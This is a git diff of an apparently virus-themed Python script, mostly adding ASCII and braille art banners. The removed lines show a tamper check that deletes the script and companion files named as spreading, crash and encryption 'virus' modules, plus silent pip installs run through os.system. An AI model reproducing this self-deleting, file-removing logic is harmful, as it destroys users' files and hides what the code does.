+⠀⠀⠀⠀⠀⠀⣼⠀⣽⠀⡀⠀⣧⠀⢸⡀⠘⣿⢺⣯⠾⣷⠈⠉⠛⠶⢤⣄⣀⣀⣤⠶⠻⠿⠀⠸⢁⣿⣿⣹⢿⣿⡇⠀⣿⡄⠀⠀⠀⢸⡇⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣿⠀⣿⠀⠀⠀⣿⠀⢸⡇⣀⣿⣾⣟⣻⣿⣤⠤⠀⠀⢶⡈⠉⠉⠀⠀⠀⠀⠀⢒⣿⣿⣿⠹⣿⣿⡇⠀⣿⣇⠀⠀⠀⢸⡇⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠘⡏⢀⡟⠁⠀⢠⣿⡆⢸⡇⢹⡟⢿⠁⣿⠛⠳⠶⠦⣤⣌⡁⠀⠀⠀⢀⣤⠶⠟⠛⠉⠁⣿⣿⢾⣿⡇⠀⣿⣧⠀⠀⠀⠘⡇⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢸⣟⣋⡇⠖⠃⢸⣿⣇⢸⡇⣾⡇⢈⠰⣿⠆⠀⠀⠀⠀⠈⠻⣦⢀⣼⠋⠀⠀⠀⢀⣠⣶⢿⣟⣾⣿⣷⠀⣿⣿⠀⠀⠀⢘⡇⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣶
+⠀⠀⠀⠀⠀⣸⡏⢉⡇⠄⠀⣼⣿⣿⢸⣧⣾⣃⣬⣶⡟⠳⣦⣀⠀⠀⠀⠀⢹⣿⠃⠀⠠⣠⣴⠾⠋⠀⠈⣿⣿⣿⣿⠀⣿⣿⡆⠀⠀⠈⣿⠀⢻⡆⠀⠀⠀⢀⣠⣴⣶⣿⣿⣿⣿⣿⣿
+⠀⠀⠀⠀⢠⣿⠃⢸⡇⠀⠀⣿⣿⣿⢸⡿⣿⠉⢀⡾⠁⠀⠀⠉⠛⠶⣤⣄⣰⣟⣠⡴⠟⠋⠀⠀⠀⠀⠀⠘⣧⡈⣿⢰⣿⣿⣷⠀⠀⠀⣿⡀⢸⡇⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⠀⠀⠀⠀⣼⣿⠀⢸⣇⣠⡴⠿⣯⣿⢸⡟⢁⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⢉⣿⡿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⠈⣿⠻⠿⠿⠶⢦⣼⣷⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⠀⣠⣤⣤⣀⣠⣿⡿⠶⣿⣿⠏⠀⠀⢀⣸⣼⡟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣠⣟⣡⣵⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⣿⣶⣄⡀⠀⠀⠙⠿⣿⡟⠻⠿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠁⠀
+⣼⣿⣿⣿⣿⡿⠀⠀⠀⠈⠁⣠⣤⣾⣿⣿⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣽⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⣿⣿⣿⣿⣷⣦⣴⢶⡀⠀⠀⠀⠈⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⣿⣧⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⡿⢟⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⣼⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠀⠸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢸⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⢀⣀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣤⣧⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣤⣤⣶⣮⣥⣤⣽⡆⠀⠀⠀⠀⠀⠀⠀⠀⠸⢸⡟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣥⣼⣿⣿⣿⣿⣿⣿⣿⣿⡀''','''
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣶⣾⣿⣿⣿⣿⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣿⣿⣿⣿⣷⣶⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⣠⡴⠾⠟⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠷⢦⣄⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠘⠋⠁⠀⠀⢀⣀⣤⣶⣖⣒⣒⡲⠶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⢖⣒⣒⣲⣶⣤⣀⡀⠀⠀⠈⠙⠂⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣠⢖⣫⣷⣿⣿⣿⣿⣿⣿⣶⣤⡙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⢋⣤⣾⣿⣿⣿⣿⣿⣿⣾⣝⡲⣄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣄⣀⣠⢿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠻⢿⣿⣿⣦⣳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣟⣴⣿⣿⡿⠟⠻⢿⣿⣿⣿⣿⣿⣿⣿⡻⣄⣀⣤⠀⠀⠀
+⠀⠀⠀⠈⠟⣿⣿⣿⡿⢻⣿⣿⣿⠃⠀⠀⠀⠀⠙⣿⣿⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⣿⣿⣿⠋⠀⠀⠀⠀⠘⣿⣿⣿⡟⢿⣿⣿⣟⠻⠁⠀⠀⠀
+⠤⣤⣶⣶⣿⣿⣿⡟⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⣹⣿⣿⣷⠈⢻⣿⣿⣿⣶⣦⣤⠤
+⠀⠀⠀⠀⠀⢻⣟⠀⠀⣿⣿⣿⣿⡀⠀⠀⠀⠀⢀⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⡀⠀⠀⠀⠀⢀⣿⣿⣿⣿⠀⠀⣿⡟⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠻⣆⠀⢹⣿⠟⢿⣿⣦⣤⣤⣴⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡿⢷⣤⣤⣤⣴⣿⣿⣿⣿⡇⠀⣰⠟⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠙⢀⣀⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠁⠀⣻⣿⣿⣿⣿⣿⣿⠏⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡈⠻⠿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⢿⣿⣿⣿⠿⠛⢁⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠛⣶⣦⣤⣤⣤⡤⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢤⣤⣤⣤⣶⣾⠛⠓''','''
+⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⡠⢴⣴⣾⣿⡿⠓⡠⠀⠀⠀⠀⠠⢄⠁⢀⠀⠀
+⠀⠀⠀⠀⠀⠳⣽⡽⠀⠀⡠⢊⣴⣿⣿⣿⣡⠖⠁⣀⡤⢖⠟⠁⡠⠀⡙⢿⣷⣄
+⠀⠀⠐⡀⠀⠀⠀⠀⢠⣾⣿⣿⢽⣿⣿⣿⣥⠖⣻⣯⡾⠃⠀⡔⡀⠀⣷⢸⢿⣿
+⠀⠀⠀⢰⠀⠀⠀⢠⢟⣿⠃⢀⣾⣿⠟⠋⢀⡾⢋⣾⠃⣠⡾⢰⡇⡇⣿⣿⡞⣿
+⠀⠀⡤⣈⡀⠀⢀⠏⣼⣧⡴⣼⠟⠁⠀⠀⡾⠁⣾⡇⣰⢿⠃⢾⣿⣷⣿⣿⣇⢿
+⠀⠀⠱⠼⠊⠀⠄⡜⣿⣿⡿⠃⠈⠁⠀⢸⠁⢠⡿⣰⢯⠃⠀⠘⣿⣿⣿⣿⣿⠸
+⠀⠀⠀⠀⠀⠀⡘⡀⣸⣿⣱⡤⢴⣄⠀⠈⠀⠘⣷⠏⠌⠢⡀⠀⢿⣿⣿⣿⡟⡄
+⠀⠀⠀⠀⢀⣌⠌⣴⣿⣿⠃⣴⣿⣟⡇⠀⠀⠀⠟⠀⠀⠀⠈⠢⢈⣿⡟⣿⡗⡇
+⠀⠀⢀⡴⡻⣡⣾⠟⢹⡇⠀⡇⢄⢿⠇⠀⠀⠀⠀⠀⠀⣽⣶⣄⡀⠘⢷⡹⣿⣿
+⠀⠀⣧⣾⡿⠋⠁⢀⡜⠙⡄⠓⠐⠁⠀⠀⠀⠀⠀⠀⡼⠛⠻⣟⠛⣆⠈⢷⣿⣿
+⣴⣾⣟⣵⣿⣿⣿⣁⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡧⠠⠔⡹⠀⢸⠀⣼⣿⣿
+⠿⡽⢫⡉⠀⣠⠔⠁⡀⠕⠠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠖⠊⠀⠀⢊⣾⢿⡿⠉
+⠀⠁⠀⡹⢨⠁⠐⠈⢀⡠⠐⠁⠄⠡⡀⡀⠀⠀⠀⠀⠀⠀⠀⠠⠶⢛⡨⠊⠀⠀
+⠀⠀⡜⠀⠈⣂⠀⠀⠀⠀⡠⠐⠉⡆⠀⣀⢀⣀⣀⣀⡀⠀⠀⣀⠴⣁⡀⠤⠀⠀
+⠀⠈⠀⠀⠀⡇⠑⢄⠀⠀⠀⠀⣲⢥⡎⠀⢰⠀⢸⠀⢀⠉⠙⣿⣧⣀⣀⣂⣤⣼
+⠀⠀⠀⠆⠁⠃⠀⠀⠈⠒⠒⠊⣸⠚⠁⠀⠀⠀⠀⠀⠀⠀⡜⠁⠀⠀⠀⠀⠈⠚
+⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⢀⠋⢆⠀⠀⠀⠀⠀⠀⠀⡘⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠒⠂⠀⠀⠐⠋''')
+asci_name = random.choice(asci)
 def ascii():
-	G = ('\033[92m')
-	R = ('\033[31m')
 	print('''\033[31m
         	uuuuuuu
              uu$$$$$$$$$$$uu
@@ -58,14 +209,7 @@ $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
   $$$$$$$$$$""""           ""$$$$$$$$$$$"
    "$$$$$"                      ""$$$$""
      $$$"                         $$$$"''')
-
-R = ('\033[31m')
-W = ("\033[97m")
-import os
-
-va = ['.Open.py', '.config_virus.py', '.spreading_virus.py', '.delet_virus.py', '.crash_virus.py','.encrypted_virus.py','.decrypted_virus.py']
-def gun():
-	print(W+'''
+dead=[W+'''
 	.____.
    xuu$``$$$uuu.
  . $``$  $$$`$$$
@@ -127,60 +271,600 @@ dP*$  $  $$$ $$$
                                        ^!$$$$$$$$$$$$$$$$$$$$>
                                            `"#+$$$$$$$$$$$$$$>
                                                  ""**$$$$$$$$>
-                                                        ''')
-	def check_for_modifications():
-	    script_path = os.path.abspath(__file__)
-	
-	    with open(script_path, 'rb') as f:
-	        current_script_hash = hashlib.md5(f.read()).hexdigest()
-	    stored_hash_path = os.path.join(os.path.dirname(script_path), '.root.txt')
-	    if not os.path.isfile(stored_hash_path):
-	        with open(stored_hash_path, "w") as f:
-	            f.write(current_script_hash)
-	    else:
-	        with open(stored_hash_path) as f:
-	            stored_script_hash = f.read()
-	
-	        if current_script_hash != stored_script_hash:
-	
-	            os.remove(script_path)
-	            for file_name in va:
-	            	if os.path.isfile(file_name):
-	            		os.remove(file_name)
-	            exit()
-	
-	    with open(stored_hash_path, 'w') as f:
-	        f.write(current_script_hash)
-	check_for_modifications()
-gun()
-def op():
-	
-	try:
-	    import webbrowser,wget,requests
-	except ImportError:
-	    os.system('pip3 install webbrowser')
-	    os.system('pip3 install wget')
-	    os.system('pip3 install requests')
-	    import webbrowser,wget,requests
+                                                        ''','''⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠄⢀⠂⠠⠐⡀⢀⠂⠀⠄⠀⡀⠀⠀⠂⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⡀⠄⠂⠌⠠⢁⠂⠌⠄⡈⠄⠀⠁⠀⠄⠀⠈⠐⠈⡐⠠⢁⠊⠄⡐⠠⠀⠂⠤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠴⠋⠄⢂⠡⡐⢈⡐⠨⠐⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⡀⠠⠁⠂⠌⠐⡀⠣⠌⡐⠠⢀⠙⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢋⡐⢂⠌⣂⠢⠐⢂⠐⠀⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡀⠁⠄⢃⡐⠠⡑⣀⠢⠐⡈⠳⣄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⡾⢃⠌⢢⡐⠡⠂⠄⠂⠡⠀⠄⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠄⠀⠡⢐⠀⠆⡱⠠⡁⠌⡳⣄⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣰⡏⠣⢌⡌⡡⢌⠡⠁⠌⠠⠁⠈⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠄⠂⠡⠐⢀⠊⠄⡡⢃⠰⡁⢆⠹⣆⠀⠀⠀
+⠀⠀⠀⠀⣰⢏⡰⢉⡒⢤⠑⡂⢂⠁⠂⡀⠁⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠁⠐⢀⠈⡐⠄⣃⠱⡈⢆⠱⡘⣧⠀⠀
+⠀⠀⠀⢠⡿⢠⡘⢇⡸⠄⢣⠠⠄⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠠⠀⠤⡀⢇⠸⡘⡄⢣⢸⡇⠀
+⠀⠀⠀⣼⡃⢧⢘⣂⢒⡉⡐⠄⡈⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⢁⠂⡅⢊⠦⢱⡈⢇⡊⣧⠀
+⠀⠀⠀⣿⡘⣆⠣⣄⠣⡐⠰⢀⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠂⡔⠡⠚⡤⡑⢮⡐⣿⡂
+⠀⠀⠀⣿⡔⣣⢚⠄⢣⠡⡈⠄⡀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠈⢀⡐⠠⣁⠳⠰⣉⢦⡑⣿⡁
+⠀⠀⠀⢿⡲⣅⠎⡘⣄⠣⠐⠤⡐⡰⢠⣡⣦⣶⣾⣷⣾⣷⣿⣷⣶⣦⣀⠣⡐⢄⠆⡰⢄⣆⣳⣼⣶⣿⣶⣷⣶⣦⣽⣖⣦⡁⠤⢠⠑⡄⣊⠱⢌⢲⣯⣿⠀
+⠀⠀⠀⢸⣷⣿⠠⣑⡦⢡⣏⢶⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣏⡱⢌⠲⣹⣮⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣇⢮⡐⢦⡑⢌⣺⣿⡇⠀
+⠀⠀⠀⠀⣿⣿⢀⣿⡜⣣⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡝⣌⠣⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡝⢦⣿⠠⣿⣿⠃⠀
+⠀⠀⠀⠀⢹⣿⠆⣿⣞⡱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠖⡠⠣⢽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⡞⣥⣿⢸⣿⡏⠀⠀
+⠀⠀⠀⠀⠀⢻⡜⣿⢦⡙⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⣟⠄⠡⠑⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢣⡟⠴⣿⣸⡿⠀⠀⠀
+⠀⠀⠀⠀⠀⠘⣯⣿⢣⡘⠤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢁⣯⠀⠑⡈⢍⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠐⣌⠳⣿⣽⠃⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠸⣿⢣⡘⠤⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⠋⢄⠀⠀⠀⣌⠓⡍⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⡁⢆⢱⣿⠃⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣿⡧⡘⠤⢃⠚⠻⣿⣿⣿⣿⣿⣿⣿⠿⢛⠱⠴⢈⠐⣀⢠⣄⢀⣀⢉⡡⠆⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠠⠁⡌⢼⣿⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢻⣷⣉⠶⣁⠎⡡⢐⡉⢉⣉⡉⡁⠀⠐⠘⠀⣔⢈⣄⣷⣾⣿⣷⣮⡺⡅⠀⢂⠈⣐⠢⣬⡉⡉⣉⢋⠀⡀⢂⠁⢆⢸⣾⣿⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠘⢿⣮⣞⡴⣩⢖⣡⢚⡤⡡⢆⠡⠌⠂⢌⠂⠼⢮⣿⣿⣿⣿⣿⣿⣿⣿⠂⡄⠌⢄⠒⡠⢁⠥⢢⠆⡜⡰⣌⣼⣶⣻⣿⠃⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣯⣯⣽⣷⣾⡽⣌⢣⠍⡜⢠⢈⠒⢯⣿⠟⣛⣍⣛⣿⢛⣽⠃⡔⢊⡔⢪⡑⢮⣼⣧⣾⣽⣷⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢙⢻⣿⡽⣎⠞⡬⡑⢎⡘⣄⠢⡉⠥⢉⢋⠄⡃⡤⢉⡔⢣⠜⣥⢞⣯⣿⡿⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡟⣧⡟⣴⢩⡖⢰⡄⢣⠐⢢⡌⡄⢢⠑⡄⢣⡜⢢⠛⣴⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣷⣣⢏⡖⣣⢜⣢⢣⡒⣤⠱⡌⢦⡑⢮⢴⣫⣾⣿⣿⣷⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠋⠿⣿⡿⠿⣷⣎⣿⣵⣯⣖⣯⣿⣾⣹⣾⠷⢿⣿⠟⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣇⠐⣿⡄⠀⢈⣿⠀⠀⠈⣿⠁⠀⠀⣿⠁⠀⠀⣿⠈⣾⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠦⢿⣦⣀⣀⣿⠀⠀⠀⣿⡀⠀⠀⣿⣀⣀⣼⡷⢸⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣎⣼⠇⠈⢉⣿⠉⠙⠉⣯⠉⠙⠉⣿⠉⠀⢀⣿⣰⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡿⢷⡶⢶⣿⣄⣀⣠⣿⣤⣀⣤⣿⡶⣶⣾⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣧⣝⡲⡜⣬⢋⡗⡬⣃⢯⡱⢆⡳⡼⣼⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠓⠻⠶⠿⠼⠷⠾⠶⠿⠚⠛⠛⢁⡀
+'''+R+'''__     ___                 '''+W+'''
+'''+R+'''\ \   / (_)_ __ _   _ ___   _ __  _   _'''+W+'''
+'''+R+''' \ \ / /| | '__| | | / __| | '_ \| | | |'''+W+'''
+'''+R+'''  \ V / | | |  | |_| \__ \_| |_) | |_| |'''+W+'''
+'''+R+'''   \_/  |_|_|   \__,_|___(_) .__/ \__, |'''+W+'''
+'''+R+'''                           |_|    |___/'''+W+'''
+''','''
+''','''
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⣟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣯⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
